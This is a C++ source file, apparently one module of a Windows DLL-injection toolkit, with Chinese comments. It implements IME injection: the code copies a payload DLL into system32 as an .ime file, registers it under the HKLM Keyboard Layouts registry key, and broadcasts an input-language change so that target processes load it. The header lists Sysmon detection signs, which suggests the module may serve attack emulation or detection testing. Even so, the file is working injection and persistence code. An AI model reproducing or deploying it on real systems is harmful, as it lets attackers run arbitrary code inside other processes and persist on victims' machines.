// ════════════════════════════════════════════════════════════════
//  方法 7: 输入法注入 (IME Injection)
//
//  原理：
//    输入法文件 (.ime) 本质是 DLL，加载到 C:\Windows\system32。
//    切换输入法时 imm32.dll 加载 IME 模块，IME 的 DllMain 中
//    可以 LoadLibrary 目标 DLL。
//    本方法模拟：将 payload.dll 复制为 .ime 文件并注册为输入法。
//
//  检测特征：
//    - Sysmon Event 7:  ImageLoad payload.dll（通过 IME 加载链）
//    - 注册表修改: HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layouts
//    - 特殊：DLL 通过系统输入法机制加载，非传统注入路径
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <iostream>

bool Inject_IME(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 输入法注入 → PID=%lu\n", pid);
    Print(L"  [!] 注意: 此方法需要 payload.dll 是有效的 IME 模块\n");
    Print(L"  [*] 简化实现: 通过注册表注册 IME，等待目标进程切换输入法\n\n");

    // 1. 将 payload.dll 复制到 system32 并改名为 .ime
    wchar_t sysDir[MAX_PATH]{};
    GetSystemDirectoryW(sysDir, MAX_PATH);

    wchar_t imePath[MAX_PATH]{};
    swprintf_s(imePath, L"%s\\sewinject.ime", sysDir);

    if (!CopyFileW(dllPath, imePath, FALSE))
    {
        Print(L"  [!] 复制到 system32 失败: %lu (需要管理员权限)\n", GetLastError());
        return false;
    }
    Print(L"  [+] 已复制到 %s\n", imePath);

    // 2. 注册为输入法
    //    HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layouts\0000XXXX
    wchar_t regKey[256]{};
    HKEY hKey = nullptr;
    LSTATUS ok = ERROR_SUCCESS;

    // 使用一个不常见的 layout ID
    swprintf_s(regKey, L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\0002F001");

    ok = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regKey, 0, nullptr, 0,
        KEY_SET_VALUE, nullptr, &hKey, nullptr);
    if (ok != ERROR_SUCCESS)
    {
        Print(L"  [!] 注册表写入失败: %lu (需要管理员权限)\n", ok);
        DeleteFileW(imePath);
        return false;
    }

    RegSetValueExW(hKey, L"IME File", 0, REG_SZ,
        (BYTE*)L"sewinject.ime", (DWORD)(wcslen(L"sewinject.ime") + 1) * 2);
    RegSetValueExW(hKey, L"Layout Text", 0, REG_SZ,
        (BYTE*)L"SEWindows Test IME", (DWORD)(wcslen(L"SEWindows Test IME") + 1) * 2);
    RegSetValueExW(hKey, L"Layout Display Name", 0, REG_SZ,
        (BYTE*)L"SEWindows Attack IME", (DWORD)(wcslen(L"SEWindows Attack IME") + 1) * 2);
    RegCloseKey(hKey);

    Print(L"  [+] 已注册输入法: %s\n", regKey);
    Print(L"  [*] 切换到此输入法时，payload.dll 将被加载\n");
    Print(L"  [*] 需要用户手动切换输入法或重启输入法服务\n");

    // 3. 尝试通过 SendMessage 通知系统输入法变化
    DWORD_PTR result = 0;
    SendMessageTimeoutW(HWND_BROADCAST, WM_INPUTLANGCHANGEREQUEST, 0,
        MAKELPARAM(0, 0x0002), SMTO_ABORTIFHUNG, 1000, &result);

    Print(L"  [*] 已广播输入法切换请求\n");
    Print(L"  [✓] 输入法注入已部署（等待目标进程切换输入法时生效）\n");
    return true;
}
